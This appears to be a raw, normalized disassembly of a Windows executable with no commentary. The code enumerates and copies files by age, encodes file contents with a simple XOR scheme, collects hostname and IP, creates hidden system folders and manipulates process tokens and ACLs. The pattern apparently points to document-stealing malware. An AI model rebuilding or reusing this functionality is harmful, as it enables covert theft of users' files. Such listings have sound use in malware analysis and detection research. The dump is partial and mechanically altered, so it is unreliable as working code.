push 0x2e
push eax
call sub_40c390
mov edi [ lstrcmpiA@IAT ]
add esp 0x8
mov ebx eax
mov esi rw-data
pop edi
pop esi
xor eax eax
pop ebx
retn
test ebx ebx
je r-xdata
push rw-data
push esi
call edi
test eax eax
je r-xdata
lea ecx [ esi + 0x2 ]
lea edx [ ebx + 0x1 ]
push ecx
push edx
call edi
test eax eax
je r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
retn
add esi 0x10
cmp esi rw-data
jl r-xdata
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
sub_402560
sub esp 0x550
push 0x0
call [ CoInitialize@IAT ]
lea eax [ esp ]
push eax
push r--data
push 0x1
push 0x0
push r--data
call [ CoCreateInstance@IAT ]
test eax eax
jl r-xdata
add esp 0x550
retn
mov eax [ esp ]
lea edx [ esp + 0x4 ]
push edx
push r--data
mov ecx [ eax ]
push eax
call [ ecx ]
test eax eax
jl r-xdata
mov eax [ esp ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov ecx [ esp + 0x554 ]
lea eax [ esp + 0x348 ]
push 0x104
push eax
push 0xffffffff
push ecx
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
mov eax [ esp + 0x4 ]
lea ecx [ esp + 0x348 ]
push 0x0
push ecx
mov edx [ eax ]
push eax
call [ edx + 0x14 ]
test eax eax
jl r-xdata
mov eax [ esp + 0x4 ]
push eax
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ esp ]
lea ecx [ esp + 0x8 ]
push 0x2
push ecx
mov edx [ eax ]
lea ecx [ esp + 0x150 ]
push 0x104
push ecx
push eax
call [ edx + 0xc ]
test eax eax
jl r-xdata
cmp [ esp + 0x148 ] 0x42
jle r-xdata
mov edx [ esp + 0x8 ]
and edx 0x10
cmp dl 0x10
je r-xdata
lea eax [ esp + 0x34 ]
push eax
call sub_402500
add esp 0x4
test eax eax
je r-xdata
lea ecx [ esp + 0x148 ]
push ecx
call sub_402a60
add esp 0x4
sub_402660
sub esp 0x640
lea eax [ esp ]
push ebx
push esi
push edi
push 0x8
push 0x100
push eax
call sub_4059c0
lea edi [ esp + 0x18 ]
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x44c ]
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0xc ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x10c ]
and ecx 0x3
push eax
[ edi ] [ esi ]
lea ecx [ esp + 0x10 ]
push ecx
call [ FindFirstFileA@IAT ]
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
pop edi
pop esi
pop ebx
add esp 0x640
retn
push ebp
mov ebp [ FindNextFileA@IAT ]
or ecx 0xffffffff
lea edi [ esp + 0x450 ]
xor eax eax
lea edx [ esp + 0x250 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x250 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ esp + 0x250 ]
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x13c ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x250 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call sub_402560
add esp 0x4
lea ecx [ esp + 0x110 ]
push ecx
push ebx
call ebp
test eax eax
jne r-xdata
push ebx
call [ FindClose@IAT ]
pop ebp
sub_4027c0
push ecx
call sub_405b40
call sub_405c40
call sub_402660
mov eax [ rw-data ]
mov [ esp ] 0x0
test eax eax
jle r-xdata
pop ecx
retn
push ebx
push ebp
push esi
push edi
mov edi rw-data
mov eax [ esp + 0x10 ]
mov ecx [ rw-data ]
inc eax
add edi 0x884
cmp eax ecx
mov [ esp + 0x10 ] eax
jl r-xdata
lea ebp [ edi + 0x4 ]
lea esi [ edi + 0x104 ]
mov eax [ edi ]
xor ebx ebx
test eax eax
jle r-xdata
pop edi
pop esi
pop ebp
pop ebx
push esi
push ebp
call sub_402830
mov eax [ edi ]
add esp 0x8
inc ebx
add esi 0x40
cmp ebx eax
jl r-xdata
sub_402830
sub esp 0x65c
mov eax [ esp + 0x660 ]
push ebx
push ebp
push esi
push edi
push eax
lea ecx [ esp + 0x470 ]
push rw-data
push ecx
call sub_40c272
add esp 0xc
lea edx [ esp + 0x2c ]
lea eax [ esp + 0x46c ]
push edx
push eax
call [ FindFirstFileA@IAT ]
mov ebx eax
cmp ebx 0xffffffff
mov [ esp + 0x18 ] ebx
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x65c
retn
mov ebp [ esp + 0x674 ]
mov ebx [ esp + 0x18 ]
lea ecx [ esp + 0x2c ]
push ecx
push ebx
call [ FindNextFileA@IAT ]
test eax eax
je r-xdata
lea edi [ esp + 0x58 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x16c ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
mov edx [ esp + 0x670 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
lea eax [ esp + 0x26c ]
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x16c ]
push ecx
push edx
push rw-data
push eax
call sub_40c272
mov al [ esp + 0x3c ]
add esp 0x10
test al 0x10
je r-xdata
push ebx
call [ FindClose@IAT ]
jmp r-xdata
mov eax [ rw-data ]
mov ebx 0x1
cmp eax 0xffffffff
je r-xdata
lea ecx [ esp + 0x26c ]
push ebp
push ecx
call sub_402830
add esp 0x8
test eax eax
je r-xdata
cmp [ esp + 0x58 ] 0x2e
je r-xdata
mov edi ebp
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
cmp ecx 0x2
jb r-xdata
lea edx [ esp + 0x1c ]
push edx
call [ GetSystemTime@IAT ]
lea eax [ esp + 0x10 ]
lea ecx [ esp + 0x1c ]
push eax
push ecx
call [ SystemTimeToFileTime@IAT ]
mov eax [ rw-data ]
push 0xffffff36
cdq
push 0xd5964000
push edx
push eax
call sub_40c7c0
mov ecx [ esp + 0x10 ]
mov edi [ esp + 0x14 ]
add ecx eax
lea eax [ esp + 0x40 ]
adc edi edx
lea edx [ esp + 0x10 ]
push edx
push eax
mov [ esp + 0x18 ] ecx
mov [ esp + 0x1c ] edi
call [ CompareFileTime@IAT ]
test eax eax
jge r-xdata
push ebx
call [ FindClose@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x65c
retn
jmp r-xdata
mov esi rw-data
mov eax ebp
xor ebx ebx
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
test ebx ebx
je r-xdata
lea eax [ esp + 0x58 ]
push 0x2e
push eax
call sub_40c390
add esp 0x8
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
lea eax [ esp + 0x26c ]
push eax
call sub_402a60
add esp 0x4
lea esi [ ebp + 0x2 ]
inc eax
mov al [ ebp + 0x2 ]
test al al
jne r-xdata
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
jmp r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sub_402a60
sub esp 0x608
push ebx
mov ebx [ esp + 0x610 ]
push ebp
push esi
push edi
push 0x5c
push ebx
call sub_40c390
mov edx eax
add esp 0x8
test edx edx
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x608
retn
or ecx 0xffffffff
mov edi rw-data
xor eax eax
lea ebp [ esp + 0x18 ]
[ edi ]
not ecx
sub edi ecx
push 0x0
mov eax ecx
mov esi edi
mov edi ebp
lea ebp [ esp + 0x1c ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi edx
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ esp + 0x21c ]
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x1c ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x21c ]
push ecx
push ebx
call [ CopyFileA@IAT ]
lea edx [ esp + 0x18 ]
push rw-data
push edx
lea eax [ esp + 0x20 ]
push rw-data
push eax
call sub_40c272
lea ecx [ esp + 0x228 ]
push ecx
call sub_402d40
mov esi eax
add esp 0x14
cmp esi 0xffffffff
je r-xdata
lea edx [ esp + 0x218 ]
push edx
call [ DeleteFileA@IAT ]
test esi esi
je r-xdata
mov ecx [ rw-data ]
xor edx edx
div ecx
xor edx edx
mov edi eax
mov eax esi
div ecx
mov [ esp + 0x10 ] edi
test edx edx
je r-xdata
push ecx
call sub_40c823
mov ebp eax
add esp 0x4
test ebp ebp
je r-xdata
inc edi
mov [ esp + 0x10 ] edi
cmp esi [ rw-data ]
ja r-xdata
lea edx [ esp + 0x218 ]
push rw-data
push edx
call sub_40c515
add esp 0x8
mov [ esp + 0x14 ] eax
test eax eax
je r-xdata
lea eax [ esp + 0x18 ]
lea ecx [ esp + 0x218 ]
push eax
push ecx
call sub_402df0
add esp 0x8
jmp r-xdata
push ebp
call sub_40c7f4
add esp 0x4
lea ecx [ esp + 0x218 ]
push 0x0
push ecx
call [ SetFileAttributesA@IAT ]
lea edx [ esp + 0x218 ]
push edx
call [ DeleteFileA@IAT ]
lea eax [ esp + 0x218 ]
lea ecx [ esp + 0x18 ]
push eax
push ecx
call sub_40c790
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
add esp 0x608
retn
mov ebx 0x1
cmp edi ebx
jl r-xdata
push eax
call sub_40c3b7
add esp 0x4
jmp r-xdata
push ebx
lea eax [ esp + 0x21c ]
push edi
push eax
lea ecx [ esp + 0x424 ]
push rw-data
push ecx
call sub_40c272
lea edi [ esp + 0x42c ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x2c ]
[ edi ]
not ecx
sub edi ecx
push rw-data
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x30 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x30 ]
push ecx
push rw-data
push edx
call sub_40c272
mov eax [ esp + 0x38 ]
mov ecx [ rw-data ]
push eax
push ecx
push 0x1
push ebp
call sub_40c40d
lea edx [ esp + 0x44c ]
push rw-data
push edx
mov edi eax
call sub_40c515
mov esi eax
add esp 0x3c
test esi esi
je r-xdata
mov eax [ esp + 0x14 ]
push esi
push edi
push 0x1
push ebp
call sub_40c528
push esi
call sub_40c3b7
lea eax [ esp + 0x2c ]
lea ecx [ esp + 0x42c ]
push eax
push ecx
call sub_402df0
lea edx [ esp + 0x34 ]
lea eax [ esp + 0x234 ]
push edx
push eax
call sub_405aa0
add esp 0x24
lea ecx [ esp + 0x418 ]
push ecx
call [ DeleteFileA@IAT ]
lea edx [ esp + 0x418 ]
lea eax [ esp + 0x18 ]
push edx
push eax
call sub_40c790
mov eax [ esp + 0x18 ]
add esp 0x8
inc ebx
cmp ebx eax
jle r-xdata
mov edi [ esp + 0x10 ]
sub_402d40
mov eax [ esp + 0x4 ]
push esi
push 0x0
push 0x80
push 0x3
push 0x0
push 0x3
push 0x80000000
push eax
call [ CreateFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
push edi
push 0x0
push esi
call [ GetFileSize@IAT ]
push esi
mov edi eax
call [ CloseHandle@IAT ]
mov eax edi
pop edi
pop esi
retn
or eax eax
pop esi
retn
sub_402d90
push esi
push edi
mov edi [ esp + 0xc ]
push rw-data
push edi
call sub_40c515
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
push esi
push 0x4
lea eax [ esp + 0x14 ]
push 0x1
push eax
call sub_40c40d
push esi
call sub_40c3b7
push edi
call sub_402d40
mov ecx eax
mov edx [ esp + 0x24 ]
and ecx 0xff
add esp 0x18
shl ecx 0x10
shr eax 0x8
or ecx eax
xor eax eax
pop edi
pop esi
lea ecx [ ecx + ecx * 2 ]
cmp edx ecx
sete al
retn
pop edi
pop esi
retn
sub_402df0
sub esp 0x10
push ebx
push esi
mov esi [ esp + 0x1c ]
push edi
push esi
call sub_402d90
add esp 0x4
test eax eax
je r-xdata
push esi
call sub_402d40
mov ecx [ rw-data ]
add esp 0x4
cmp eax ecx
mov [ esp + 0x10 ] eax
ja r-xdata
mov eax [ esp + 0x24 ]
push 0x0
push eax
push esi
call [ CopyFileA@IAT ]
pop edi
pop esi
pop ebx
add esp 0x10
retn
pop edi
pop esi
pop ebx
add esp 0x10
retn
push rw-data
push esi
call sub_40c515
mov ecx [ esp + 0x2c ]
push rw-data
push ecx
mov ebx eax
call sub_40c515
add esp 0x10
mov esi eax
test ebx ebx
je r-xdata
test esi esi
je r-xdata
push ebp
mov ebp [ rw-data ]
mov [ esp + 0x18 ] ebp
mov [ esp + 0x1c ] 0x0
fild [ esp + 0x18 ]
fmul [ r--data ]
call sub_40c8e8
mov edi 0x10
push ebp
sub edi eax
call sub_40c823
add esp 0x4
mov [ rw-data ] eax
test eax eax
pop ebp
je r-xdata
push edi
call sub_40c823
add esp 0x4
mov [ rw-data ] eax
test eax eax
je r-xdata
mov edx [ esp + 0x10 ]
mov eax [ rw-data ]
push ebx
push edx
push 0x1
push eax
call sub_40c40d
mov ecx [ rw-data ]
push eax
mov eax [ rw-data ]
lea edx [ esp + 0x20 ]
push ecx
push edx
push eax
call sub_406389
add esp 0x20
test eax eax
jne r-xdata
push ebx
call sub_40c3b7
push esi
call sub_40c3b7
mov edx [ rw-data ]
push edx
call sub_40c7f4
mov eax [ rw-data ]
push eax
call sub_40c7f4
mov ecx [ esp + 0x34 ]
mov edx [ esp + 0x30 ]
push ecx
push edx
call sub_405aa0
add esp 0x18
mov ecx [ esp + 0xc ]
mov edx [ rw-data ]
push ecx
push edx
call sub_402f80
mov eax [ esp + 0x14 ]
push esi
push 0x4
lea edx [ esp + 0x20 ]
lea ecx [ eax + 0x4 ]
push 0x1
mov eax ecx
push edx
and eax 0xff
shl eax 0x10
shr ecx 0x8
or eax ecx
lea ecx [ eax + eax * 2 ]
mov [ esp + 0x28 ] ecx
call sub_40c528
mov eax [ esp + 0x24 ]
mov ecx [ rw-data ]
push esi
push eax
push 0x1
push ecx
call sub_40c528
add esp 0x28
sub_402f80
push edi
mov edi [ esp + 0xc ]
xor ecx ecx
test edi edi
jle r-xdata
pop edi
retn
push esi
mov esi [ esp + 0xc ]
mov al [ ecx + esi ]
add al cl
mov dl al
shr dl 0x4
shl al 0x4
add dl al
xor dl 0x23
mov [ ecx + esi ] dl
inc ecx
cmp ecx edi
jl r-xdata
pop esi
sub_402fb0
push ebx
mov ebx [ WaitForSingleObject@IAT ]
push ebp
mov ebp [ Sleep@IAT ]
push esi
mov esi [ SetEvent@IAT ]
push edi
mov edi [ ExitProcess@IAT ]
push 0x1
call ebp
jmp r-xdata
mov ecx [ rw-data ]
push ecx
call esi
push 0x1
call edi
mov eax [ rw-data ]
push 0x0
push eax
call ebx
test eax eax
jne r-xdata
sub_402ff0
mov eax 0x5fac
call sub_40c910
push ebx
push esi
push edi
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0xc ]
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0xc ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
push rw-data
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x10 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call sub_40c515
add esp 0x8
test eax eax
je r-xdata
push 0x5
lea ecx [ esp + 0x110 ]
push 0x100
push ecx
call sub_4059c0
mov eax 0x1
lea edi [ esp + 0x118 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebx
add esp 0x5fac
retn
push eax
call sub_40c3b7
mov esi [ GetPrivateProfileIntA@IAT ]
add esp 0x4
lea ecx [ esp + 0xc ]
push ecx
push 0x0
push rw-data
push rw-data
call esi
lea edx [ esp + 0xc ]
mov [ rw-data ] eax
push edx
push 0x4e2000
push rw-data
push rw-data
call esi
mov [ rw-data ] eax
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x210 ]
push 0x5dac
push ecx
push rw-data
push rw-data
push rw-data
call [ GetPrivateProfileStringA@IAT ]
lea edx [ esp + 0xc ]
push edx
push 0xffffffff
push rw-data
push rw-data
call esi
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp eax 0x2710
jae r-xdata
cmp eax 0x4e2000
jbe r-xdata
mov [ rw-data ] 0x2710
jmp r-xdata
lea eax [ esp + 0x20c ]
push eax
call sub_4031b0
add esp 0x4
pop edi
pop esi
pop ebx
add esp 0x5fac
retn
mov [ rw-data ] 0x4e2000
sub_4031b0
mov eax 0x5dac
call sub_40c910
push esi
push edi
mov ecx 0x154a
xor eax eax
mov edi rw-data
mov [ rw-data ] 0x0
[ edi ]
mov edi [ esp + 0x5db8 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x8 ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea esi [ esp + 0x8 ]
dec esi
test edi edi
je r-xdata
mov [ esi ] 0x0
mov eax [ rw-data ]
mov ecx eax
push edi
shl ecx 0x4
add ecx eax
shl ecx 0x5
add ecx eax
lea edx [ ecx * 4 + rw-data ]
push edx
call sub_403280
mov eax [ rw-data ]
add esp 0x8
inc eax
mov [ rw-data ] eax
jmp r-xdata
mov eax [ rw-data ]
pop edi
inc eax
pop esi
mov [ rw-data ] eax
add esp 0x5dac
retn
mov eax [ rw-data ]
push edi
mov ecx eax
shl ecx 0x4
add ecx eax
shl ecx 0x5
add ecx eax
lea edx [ ecx * 4 + rw-data ]
push edx
call sub_403280
add esp 0x8
lea edi [ esi + 0x1 ]
push 0x3b
push edi
call sub_40c650
mov esi eax
add esp 0x8
test esi esi
je r-xdata
sub_403280
mov eax 0x5dac
call sub_40c910
push ebx
push esi
push edi
mov edi [ esp + 0x5dc0 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0xc ]
mov eax ecx
mov esi edi
mov edi edx
push 0x2c
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x10 ]
push ecx
call sub_40c650
mov edx eax
add esp 0x8
test edx edx
je r-xdata
pop edi
pop esi
pop ebx
add esp 0x5dac
retn
lea edi [ esp + 0xc ]
or ecx 0xffffffff
xor eax eax
mov [ edx ] 0x0
[ edi ]
mov ebx [ esp + 0x5dbc ]
push ebp
not ecx
sub edi ecx
lea ebp [ ebx + 0x4 ]
mov eax ecx
mov esi edi
mov edi ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
test edi edi
pop ebp
je r-xdata
mov [ edx ] 0x0
mov ecx [ ebx ]
shl ecx 0x6
xor eax eax
lea ebp [ ecx + ebx + 0x104 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
inc [ ebx ]
jmp r-xdata
mov ecx [ ebx ]
xor eax eax
shl ecx 0x6
lea edx [ ecx + ebx + 0x104 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
inc [ ebx ]
lea edi [ edx + 0x1 ]
push 0x2c
push edi
call sub_40c650
mov edx eax
add esp 0x8
test edx edx
je r-xdata
sub_403380
push esi
mov esi [ esp + 0x8 ]
push 0x0
push esi
call [ CreateDirectoryA@IAT ]
push esi
call [ GetFileAttributesA@IAT ]
or al 0x6
push eax
push esi
call [ SetFileAttributesA@IAT ]
pop esi
retn
sub_4033b0
push esi
push edi
push rw-data
push rw-data
call sub_40c515
mov edx [ esp + 0x14 ]
mov esi eax
mov edi edx
or ecx 0xffffffff
xor eax eax
push esi
[ edi ]
not ecx
dec ecx
push 0x1
push ecx
push edx
call sub_40c528
push esi
call sub_40c3b7
add esp 0x1c
pop edi
pop esi
retn
sub_4033f0
sub esp 0x200
mov ecx 0x27
xor eax eax
push esi
mov esi [ GetVersionExA@IAT ]
push edi
mov edi rw-data
[ edi ]
push rw-data
mov [ rw-data ] 0x9c
call esi
test eax eax
jne r-xdata
lea eax [ esp + 0x8 ]
push eax
push rw-data
call sub_404120
push rw-data
call sub_4033b0
lea ecx [ esp + 0x14 ]
push ecx
call sub_4033b0
add esp 0x10
pop edi
pop esi
add esp 0x200
retn
push rw-data
mov [ rw-data ] 0x94
call esi
sub_403470
sub esp 0x104
push esi
lea eax [ esp + 0x4 ]
push edi
push eax
push rw-data
mov [ esp + 0x10 ] 0x100
call [ GetComputerNameA@IAT ]
mov ecx [ esp + 0x8 ]
push rw-data
mov [ ecx + rw-data ] 0x0
call sub_4033b0
push rw-data
call sub_4033b0
add esp 0x8
lea edx [ esp + 0xc ]
push 0xff
push edx
call gethostname
test eax eax
jne r-xdata
mov edi rw-data
lea eax [ esp + 0xc ]
push eax
call gethostbyname
test eax eax
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
jmp r-xdata
mov ecx [ eax + 0xc ]
mov edx [ ecx ]
mov eax [ edx ]
push eax
call inet_ntoa
mov edi eax
jmp r-xdata
and ecx 0x3
push rw-data
[ edi ] [ esi ]
call sub_4033b0
push rw-data
call sub_4033b0
add esp 0x8
pop edi
pop esi
add esp 0x104
retn
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
sub_403550
sub esp 0x2c
mov ecx [ esp + 0x34 ]
lea edx [ esp ]
mov [ esp + 0xc ] ecx
push ebx
lea ecx [ esp + 0x38 ]
xor ebx ebx
mov [ esp + 0x2c ] edx
push ecx
lea edx [ esp + 0x14 ]
mov eax 0x1
push ebx
push edx
push eax
mov [ esp + 0x14 ] al
mov [ esp + 0x15 ] al
mov [ esp + 0x16 ] bl
mov [ esp + 0x17 ] bl
mov [ esp + 0x18 ] bl
mov [ esp + 0x19 ] bl
mov [ esp + 0x1a ] bl
mov [ esp + 0x1b ] al
mov [ esp + 0x1c ] ebx
mov [ esp + 0x24 ] 0x2
mov [ esp + 0x28 ] ebx
mov [ esp + 0x2c ] ebx
mov [ esp + 0x30 ] ebx
mov [ esp + 0x34 ] ebx
mov [ esp + 0x38 ] eax
mov [ esp + 0x48 ] ebx
call SetEntriesInAclA
test eax eax
jne r-xdata
xor eax eax
pop ebx
add esp 0x2c
retn
mov eax [ esp + 0x38 ]
mov ecx [ esp + 0x34 ]
push esi
push ebx
push eax
push ebx
push ebx
push 0x4
push 0x6
push ecx
call SetSecurityInfo
mov edx [ esp + 0x3c ]
mov esi eax
push edx
call [ LocalFree@IAT ]
xor eax eax
cmp esi ebx
pop esi
pop ebx
sete al
add esp 0x2c
retn
sub_403600
sub esp 0x10
mov ecx [ esp + 0x18 ]
lea eax [ esp + 0x4 ]
push eax
push ecx
push 0x0
mov [ esp + 0xc ] 0x1
mov [ esp + 0x18 ] 0x2
call [ LookupPrivilegeValueA@IAT ]
test eax eax
je r-xdata
xor eax eax
add esp 0x10
retn
mov eax [ esp + 0x1c ]
lea edx [ esp + 0x18 ]
push edx
mov edx [ esp + 0x18 ]
push eax
lea ecx [ esp + 0x8 ]
push 0x10
push ecx
push 0x0
push edx
mov [ esp + 0x30 ] 0x10
call [ AdjustTokenPrivileges@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
xor ecx ecx
cmp eax 0x514
setne cl
mov eax ecx
add esp 0x10
retn
sub_403690
sub esp 0x220
push ebx
push ebp
mov ebp [ esp + 0x230 ]
push esi
mov esi [ esp + 0x230 ]
push edi
push esi
push 0x0
push ebp
call [ rw-data ]
test eax eax
mov [ esp + 0x18 ] eax
jne r-xdata
mov eax [ esp + 0x18 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x220
retn
push esi
push eax
push 0x40000
call [ rw-data ]
mov edi [ GetCurrentProcess@IAT ]
mov ebx [ DuplicateHandle@IAT ]
test eax eax
mov [ esp + 0x10 ] eax
jne r-xdata
push ebp
push eax
call sub_403550
add esp 0x8
lea edx [ esp + 0x18 ]
push 0x0
push 0x0
push ebp
push edx
call edi
push eax
mov eax [ esp + 0x24 ]
push eax
call edi
push eax
call ebx
test eax eax
jne r-xdata
lea eax [ esp + 0x14 ]
push eax
push 0x28
call edi
push eax
call [ OpenProcessToken@IAT ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x10 ]
push ecx
call [ CloseHandle@IAT ]
mov [ esp + 0x18 ] eax
mov edx [ esp + 0x14 ]
lea ecx [ esp + 0x20 ]
push ecx
push rw-data
push edx
call sub_403600
add esp 0xc
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x220
retn
mov ecx [ esp + 0x14 ]
push ecx
call [ CloseHandle@IAT ]
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
push esi
push 0x0
push 0x80000
call [ rw-data ]
mov esi eax
test esi esi
je r-xdata
mov eax [ esp + 0x14 ]
lea edx [ esp + 0x20 ]
push edx
push eax
call sub_403670
add esp 0x8
mov edx [ esp + 0x14 ]
lea eax [ esp + 0x1c ]
push eax
lea ecx [ esp + 0x34 ]
push 0x200
push ecx
push 0x1
push edx
mov [ esp + 0x30 ] 0x200
call [ GetTokenInformation@IAT ]
test eax eax
je r-xdata
push esi
call [ CloseHandle@IAT ]
mov eax [ esp + 0x30 ]
push 0x0
push 0x0
push 0x0
push eax
push 0x1
push 0x6
push esi
call SetSecurityInfo
test eax eax
jne r-xdata
push eax
push eax
lea ecx [ esp + 0x18 ]
push 0x40000
push ecx
call edi
push eax
push esi
call edi
push eax
call ebx
test eax eax
jne r-xdata
mov [ esp + 0x10 ] eax
sub_403810
sub esp 0x104
push ebx
mov ebx [ esp + 0x10c ]
push ebp
push esi
test ebx ebx
push edi
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x104
retn
cmp [ ebx ] 0x0
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov edi rw-data
mov ebp ecx
or ecx 0xffffffff
[ edi ]
not ecx
push ebp
dec ecx
push rw-data
push ebx
mov esi ecx
call sub_40c940
add esp 0xc
test eax eax
jne r-xdata
push esi
push rw-data
push ebx
call sub_40c940
add esp 0xc
test eax eax
jne r-xdata
lea eax [ esp + 0x10 ]
push 0x104
push eax
call [ GetWindowsDirectoryA@IAT ]
test eax eax
je r-xdata
lea edi [ esi + ebx ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
xor eax eax
